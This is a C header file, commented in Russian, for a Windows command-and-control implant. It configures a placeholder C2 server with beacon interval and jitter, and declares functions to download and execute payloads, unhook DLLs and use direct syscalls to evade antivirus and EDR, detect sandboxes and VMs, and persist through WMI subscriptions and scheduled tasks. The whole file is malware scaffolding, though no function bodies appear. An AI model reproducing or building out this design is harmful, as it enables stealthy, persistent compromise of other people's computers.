#pragma once

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

// Конфигурация C2
#define C2_HOST L"your-c2-server.com"
#define C2_PORT 443
#define C2_PATH L"/api/v1/update"
#define BEACON_INTERVAL 30000 // 30 секунд
#define JITTER_PERCENT 25

// Определения для direct syscalls
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

// Функции для работы с сетью
BOOL InitializeWinINet(HINTERNET* hSession, HINTERNET* hConnect);
BOOL DownloadPayload(HINTERNET hConnect, LPBYTE* ppPayload, DWORD* pdwPayloadSize);
BOOL SendBeacon(HINTERNET hConnect, LPCWSTR pComputerName, LPCWSTR pUserName);

// Функции для обхода AV/EDR
BOOL UnhookDLL(const char* dllName);
BOOL IsSandbox();
BOOL IsVM();
VOID AntiAnalysis();

// Функции для персистентности
BOOL InstallPersistence();
BOOL CreateWMISubscription();
BOOL CreateScheduledTask();

// Утилиты
VOID XorDecrypt(LPBYTE pData, DWORD dwDataSize, BYTE bKey);
DWORD GetRandomJitter();
BOOL ExecutePayload(LPBYTE pPayload, DWORD dwPayloadSize);

// Функции для работы с памятью
LPVOID AllocateMemory(DWORD dwSize);
BOOL FreeMemory(LPVOID pMemory);

// Логирование (только для отладки)
#ifdef DEBUG
#define DEBUG_PRINT(msg, ...) printf(msg, __VA_ARGS__)
#else
#define DEBUG_PRINT(msg, ...)
#endif